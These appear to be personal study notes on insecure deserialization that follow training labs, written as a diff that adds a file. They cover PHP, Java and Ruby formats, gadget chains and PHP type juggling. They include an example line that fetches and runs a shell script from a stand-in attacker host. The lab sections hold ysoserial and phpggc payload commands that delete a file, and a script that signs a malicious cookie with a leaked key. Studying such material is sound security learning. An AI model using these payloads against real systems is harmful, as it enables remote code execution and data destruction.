@@ -1,0 +1,557 @@
+Serialization is the process of converting data (like an object or structure) into a format (like a string or byte stream) so it can be easily saved or sent.
+
+For example:
+An object → becomes → JSON or binary → to save to file or send over a network.
+
+Deserialization is the reverse—turning it back into an object.
+
+-
+
+Q. why is this conversion needed....when computers talk in binary anyways
+
+Without serialization, raw binary would be just a meaningless stream of 1s and 0s with no context or structure. Serialization adds that structure.
+
+-
+
+Example 
+
+1. When we write:
+
+data = {"name": "Alice"}
+serialized = json.dumps(data)
+
+    {"name": "Alice"} is a Python dictionary, not JSON yet.
+
+    json.dumps() converts that Python object into a JSON string (which is just text like '{"name": "Alice"}').
+
+    That string can now be sent over the network or saved.
+
+So:
+
+Python Object		→ json.dumps() →	JSON String (text)
+
+{"name": "Alice"}				'{"name": "Alice"}'
+
+
+Why it matters:
+
+Even though it looks similar, the in-memory object and the serialized string are different.
+
+Serialization turns live data (objects, dicts, classes) into a flat format that can leave the program — like text or binary.
+
+
+
+2. To serialize into binary instead of JSON, you can use libraries like pickle in Python.
+
+
+Here’s a simple example:
+
+import pickle
+
+data = {"name": "Alice", "age": 25}
+
+# Serialize to binary
+binary_data = pickle.dumps(data)
+
+# Deserialize back to Python object
+original_data = pickle.loads(binary_data)
+
+
+Output:
+
+    binary_data is a bytes object (not human-readable).
+
+    It can be saved to a file, sent over network, etc.
+
+
+
+So, pickle handles binary serialization, while json handles text-based.
+
+
+-
+
+Insecure deserialization is when an app loads (deserializes) untrusted data without checking it, allowing attackers to send malicious data.
+
+This can let attackers:
+
+    Run their own code
+
+    Bypass authentication
+
+    Take over the system
+
+🔧 Example:
+
+If a server blindly deserializes user-sent binary data using pickle.loads(), an attacker can craft data that executes harmful code during deserialization.
+
+Fix: Never trust user input for deserialization. Validate or avoid using unsafe formats like pickle.
+
+-
+
+In real attacks, attackers don’t create new classes on the server — instead, they:
+
+    Use existing classes already available in the app or its libraries.
+
+        Many classes have dangerous behavior in their constructors or methods.
+
+        Example: some logging or deserialization libraries may run system commands.
+
+    Exploit “gadget chains”:
+
+        A "gadget" is a class with methods (like __reduce__ or __getattr__) that do something unsafe when deserialized.
+
+        Attackers chain these gadgets together to trigger code execution — this is called a gadget chain.
+
+        No need to upload a custom Evil class — they use what’s already on the server.
+
+
+Real-world summary:
+
+✅ Attackers exploit known, dangerous classes in the app or libraries already present.
+❌ They can’t upload new class definitions unless there's some other vulnerability.
+🎯 That's why deserialization bugs often target popular libraries known to have exploitable "gadgets".
+
+-
+
+Insecure deserialization vulnerabilities checks are fundamentally flawed as they rely on checking the data after it has been deserialized, which in many cases will be too late to prevent the attack. 
+
+-
+
+🔥 How do insecure deserialization vulnerabilities arise?
+
+They usually happen when an application:
+
+    ✅ Accepts user input
+
+    ❌ Deserializes it without validation
+
+    ⚠️ Uses unsafe formats (like pickle, Java’s readObject(), PHP’s unserialize())
+
+The attacker can then inject malicious serialized data to trigger unexpected behavior, like remote code execution (RCE).
+
+
+🔁 Here's the flow:
+
+    Victim app (server) accepts serialized data — e.g., from cookies, hidden form fields, or API input.
+
+    Attacker crafts a malicious object using known dangerous classes (gadget chain).
+
+    Attacker sends it to the server (e.g., in a POST request).
+
+    Server deserializes it without validation.
+
+    During deserialization, code inside the object runs, like:
+
+	Runtime.getRuntime().exec("curl attacker.com/shell.sh | bash")
+
+
+Now the victim server runs the command — attacker gains control or steals data.
+
+-
+
+🛡 How to prevent it:
+
+    ❌ Don’t deserialize untrusted data.
+
+    ✅ Use safer formats (like JSON) that don’t support code execution.
+
+    ✅ Apply allow-lists (only deserialize expected types).
+
+    ✅ Use hardened deserialization libraries (e.g., Jackson with @JsonTypeInfo(use = JsonTypeInfo.Id.NONE)).
+
+-
+
+How to identify insecure deserialization
+
+During auditing, you should look at all data being passed into the website and try to identify anything that looks like serialized data. 
+Serialized data can be identified relatively easily if you know the format that different languages use. 
+In this section, we'll show examples from both PHP and Java serialization. 
+Once you identify serialized data, you can test whether you are able to control it.
+
+
+1. PHP serialization format
+
+PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a User object with the attributes:
+$user->name = "carlos";
+$user->isLoggedIn = true;
+
+When serialized, this object may look something like this:
+O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
+
+This can be interpreted as follows:
+
+    O:4:"User" - An object with the 4-character class name "User"
+    2 - the object has 2 attributes
+    s:4:"name" - The key of the first attribute is the 4-character string "name"
+    s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
+    s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
+    b:1 - The value of the second attribute is the boolean value true
+
+The native methods for PHP serialization are serialize() and unserialize(). If you have source code access, you should start by looking for unserialize() anywhere in the code and investigating further. 
+
+
+
+2. Java serialization format
+
+Some languages, such as Java, use binary serialization formats. 
+This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. 
+For example, serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64.
+
+
+📦 Real-world appearance:
+
+Let’s say a web app uses Java serialization to store session data in a cookie or send it in a request body. An attacker or security researcher may see something like:
+
+POST /updateProfile HTTP/1.1
+Host: example.com
+Cookie: SESSION=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAAAAABDAAAeHB3BAAAAAB4
+
+    SESSION= contains a Base64-encoded Java serialized object.
+
+    Starts with rO0A — which is ac ed in hex → clear indicator it’s a Java object.
+
+
+Any class that implements the interface java.io.Serializable can be serialized and deserialized. 
+If you have source code access, take note of any code that uses the readObject() method, which is used to read and deserialize data from an InputStream. 
+
+-
+
+Exploiting insecure deserialization vulnerabilities
+
+1. Manipulating serialized objects
+
+Exploiting some deserialization vulnerabilities can be as easy as changing an attribute in a serialized object. 
+You can then pass the malicious object into the website via its deserialization process. This is the initial step for a basic deserialization exploit. 
+
+Broadly speaking, there are two approaches you can take when manipulating serialized objects. 
+You can either edit the object directly in its byte stream form, or you can write a short script in the corresponding language to create and serialize the new object yourself. 
+The latter approach is often easier when working with binary serialization formats. 
+
+
+a) Modifying object attributes
+
+If an app stores a serialized object (like a User) in a cookie, an attacker can:
+
+    Decode it.
+
+    Modify a value (e.g., isAdmin from false to true).
+
+    Re-encode and send it back.
+
+
+Example(serialized PHP Object):
+
+O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
+
+
+Change b:0 to b:1 → now the app thinks the attacker is an admin.
+
+
+If the server unserializes this without validation:
+
+$user = unserialize($_COOKIE);
+if ($user->isAdmin === true) {
+  // attacker gets admin access
+}
+
+👉 The app blindly trusts user-modified data, leading to privilege escalation.
+
+While this exact case is rare, it shows how insecure deserialization can expose serious risks.
+
+
+b) Modifying data types
+
+PHP-based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator (==) when comparing different data types. 
+For example, if you perform a loose comparison between an integer and a string, PHP will attempt to convert the string to an integer, meaning that 5 == "5" evaluates to true.
+
+Unusually, this also works for any alphanumeric string that starts with a number. 
+In this case, PHP will effectively convert the entire string to an integer value based on the initial number. 
+The rest of the string is ignored completely. Therefore, 5 == "5 of something" is in practice treated as 5 == 5.
+
+Likewise, on PHP 7.x and earlier the comparison 0 == "Example string" evaluates to true, because PHP treats the entire string as the integer 0.
+
+Consider a case where this loose comparison operator is used in conjunction with user-controllable data from a deserialized object. This could potentially result in dangerous logic flaws.
+
+$login = unserialize($_COOKIE)
+if ($login['password'] == $password) {
+// log in successfully
+}
+
+
+$login['password'] = attacker-controlled
+
+$password = real password to compare against
+
+
+If an attacker sets password to 0 (integer), and the real password is a non-numeric string, == returns true — logging them in.
+
+Why?
+
+    PHP tries to convert both sides to a common type.
+
+    Since "password123" is not a number, PHP treats it as 0.
+
+    So: "password123" becomes 0, and 0 == 0 → ✅ true
+
+
+loose comparison (==) check only data-type
+strict comparison (===) checks both value and data-type
+
+-
+
+Note:
+
+In PHP 8 and later, the 0 == "Example string" comparison evaluates to false because strings are no longer implicitly converted to 0 during comparisons. As a result, this exploit is not possible on these versions of PHP.
+
+The behavior when comparing an alphanumeric string that starts with a number remains the same in PHP 8. As such, 5 == "5 of something" is still treated as 5 == 5.
+
+Be aware that when modifying data types in any serialized object format, it is important to remember to update any type labels and length indicators in the serialized data too. 
+Otherwise, the serialized object will be corrupted and will not be deserialized. 
+
+When working directly with binary formats, we recommend using the Hackvertor extension, available from the BApp store. 
+With Hackvertor, you can modify the serialized data as a string, and it will automatically update the binary data, adjusting the offsets accordingly. This can save you a lot of manual effort. 
+
+-
+
+2. Using application functionality
+
+Sometimes, apps use data from deserialized objects in dangerous ways.
+
+Example:
+If a User object has an image_location field used to delete the profile picture:
+
+unlink($user->image_location);
+
+
+An attacker could modify the serialized object to set image_location to any file path, causing the app to delete files it shouldn't.
+
+This is risky enough, but it gets worse when deserialization triggers magic methods (like __destruct()), which run automatically — allowing code execution without user interaction.
+
+-
+
+Magic methods
+
+They are special functions that run automatically when certain events happen, like creating or deserializing an object. 
+They're common in many languages and often start with double underscores (e.g., __construct, __wakeup in PHP).
+
+Example:
+
+    __construct() runs when an object is created.
+
+    __wakeup() runs when an object is unserialized.
+
+
+These methods are not dangerous by themselves, but if they use attacker-controlled data (like from a deserialized object), they can be exploited.
+
+In Java, a method like readObject() works the same way during deserialization and can be used to run code automatically.
+
+
+Why it matters:
+
+Magic methods let attackers trigger code execution just by sending a crafted object, even if no function is explicitly called — this is key to advanced insecure deserialization attacks.
+
+-
+
+🧨 Insecure Deserialization Attack – Simple Steps
+
+1. 🔍 Attacker reads the app’s source code
+2. 🧱 Finds a class with a magic method (`__wakeup`, `readObject`, etc.)
+   → This method does something dangerous using object data
+3. 💻 Copies that class code to their own machine
+4. 🧪 Creates an object of that class, sets malicious values
+5. 📦 Serializes the object using the same language (e.g., PHP, Java)
+6. 📤 Sends the serialized data to the app (e.g., in a cookie or request)
+7. 💥 App deserializes it → Magic method runs → exploit happens
+
+
+Key point:
+
+The attacker’s object is built *outside* the app, but runs inside it because deserialization auto-triggers the magic method. No checks. No warnings.
+
+-
+
+You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file.
+
+-
+
+🔗 Gadget Chains – Simplified
+
+* A gadget is a small piece of code in the app that can be used during deserialization.
+* Alone, a gadget may not be dangerous — but when chained, one gadget passes data to the next.
+* The final one (called a sink gadget) does something harmful, like running a command.
+
+🧨 The attacker doesn’t create new code — they just send a crafted object that triggers these gadgets in the app’s existing code, often starting with a magic method like `__wakeup()`.
+
+
+
+🔥 Insecure Deserialization + Gadget Chains via Cookies
+
+Many apps store serialized data (like session info) in cookies. If they deserialize cookie data without proper checks, attackers can send malicious serialized objects that exploit the server.
+
+
+🍪 Example Attack Flow:
+
+1. 🧱 Attacker uses tools like:
+
+   * ysoserial (Java)
+   * PHPGGC (PHP)
+
+   These tools don’t just give you gadget chains — they take those chains and build complete serialized payloads (objects) that trigger harmful behavior during deserialization.
+
+2. 🛠️ Attacker encodes the payload (usually in Base64) and sends it as a cookie:
+
+   ```
+   Cookie: session=BASE64_SERIALIZED_OBJECT
+   ```
+
+3. 💥 The app decodes + unserializes the cookie:
+
+   ```php
+   $session = unserialize(base64_decode($_COOKIE['session']));
+   ```
+
+   If a gadget chain is triggered (e.g., via a magic method), it can lead to remote code execution, file deletion, or other attacks — without needing valid login.
+
+
+
+ ⚙️ Why Pre-Built Gadget Chains Matter
+
+* Manually finding gadgets and chaining them is hard — especially without source code.
+* Tools like ysoserial and PHPGGC automate this using known vulnerable libraries (like Apache Commons Collections).
+* These tools use existing gadget chains to generate payloads attackers can drop straight into cookies or parameters.
+
+📌 That’s why insecure deserialization is dangerous — if your app uses a popular library with known gadget chains, you might be vulnerable even if your own code is safe.
+
+-
+
+Working with pre-built gadget chains
+
+1. ysoserial is a tool for Java deserialization attacks. It lets you pick a gadget chain (from common libraries) and generate a payload that runs a command or triggers behavior on the target app.
+
+
+java -jar /usr/local/bin/ysoserial.jar    [prints a basic usage message listing the available gadget chains]
+
+
+While some chains run code, others are used just to detect deserialization, like:
+
+    URLDNS: Triggers a DNS lookup to your server. Works with any Java version — great for checking if deserialization happens.
+
+    JRMPClient: Tries to connect to an IP. If the app hangs when connecting to a blocked IP but responds fast to a local IP, it shows deserialization occurred — even if you don’t see output.
+
+These help detect insecure deserialization without needing full code execution.
+
+
+
+Lab 5: Exploiting Java deserialization with Apache Commons
+
+java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+     --add-opens=java.base/java.net=ALL-UNNAMED \
+     --add-opens=java.base/java.util=ALL-UNNAMED \
+     -jar /usr/local/bin/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > payload.b64
+
+cat payload.b64
+
+paste in cookie then url encode and send
+
+
+
+2. PHP Generic Gadget Chains
+
+Languages like PHP also have tools for deserialization attacks — e.g., PHPGGC (PHP Generic Gadget Chains).
+
+But remember:
+✅ The real vulnerability is deserializing user-controlled data,
+❌ not just having gadget chains in code.
+
+Gadget chains are just tools to abuse the flaw — even if all known chains are blocked, the site may still be vulnerable if it keeps trusting user input during deserialization.
+
+
+
+Lab 6: Exploiting PHP deserialization with a pre-built gadget chain
+
+Request the /cgi-bin/phpinfo.php file in Burp Repeater and observe that it leaks some key information about the website, including the SECRET_KEY environment variable. Save this key; you'll need it to sign your exploit later. 
+
+
+a) phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
+
+-> This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's morale.txt file. 
+
+
+Simplified Syntax Breakdown:
+
+phpggc: Tool to generate PHP exploit payloads.
+Symfony/RCE4: This specifies the gadget chain to use. Symfony exploit for remote code execution.
+exec: Runs a system command.
+'rm /home/carlos/morale.txt': Command to delete /home/carlos/morale.txt.
+| base64: Encodes the payload in base64.
+
+
+
+You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes:
+
+    Assign the object you generated in PHPGGC to the $object variable.
+    Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable.
+
+
+b)
+
+<?php
+$object = "base64-OBJECT-GENERATED-BY-PHPGGC";
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+?>
+
+
+like
+
+Save this PHP Code to a File
+Create a file, e.g., generate_cookie.php, with the following content:
+
+<?php
+$object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
+$secretKey = "xt73p1sca8paib78h2yjfk2j2tsvn35h";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+?>
+
+Save this in your home directory (~/generate_cookie.php).
+
+
+c) Run the PHP File
+
+php ~/generate_cookie.php
+
+The PHP script will:
+Take the base64-encoded serialized object (generated by phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64).
+Compute an HMAC-SHA1 signature using the provided $secretKey.
+Combine them into a JSON structure and URL-encode the result.
+
+output:
+
+%7B%22token%22%3A%22Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg%3D%3D%22%2C%22sig_hmac_sha1%22%3A%2232646436cae279abca32fa0cb77ed36fb6c9cbbf%22%7D
+
+put this as cookie value and send the request
+
+-
+
+Working with documented gadget chains
+
+If no tool exists for the target framework, search online for known exploits you can adapt.
+You might need to tweak code or manually serialize objects, but it's still easier than building everything from scratch.
+
+Even if no gadget works directly, you may learn enough to build a custom exploit.
+
+
+in Ruby, the term "marshaled" is effectively the same as "serialized".
+
+Marshal.dump(obj)      # serialize (marshal) an object
+Marshal.load(data)     # deserialize (unmarshal) it
+
+
+Just by looking at the encoded cookie, you can guess it's marshaled Ruby if it starts with BAh
+
+-
+
+
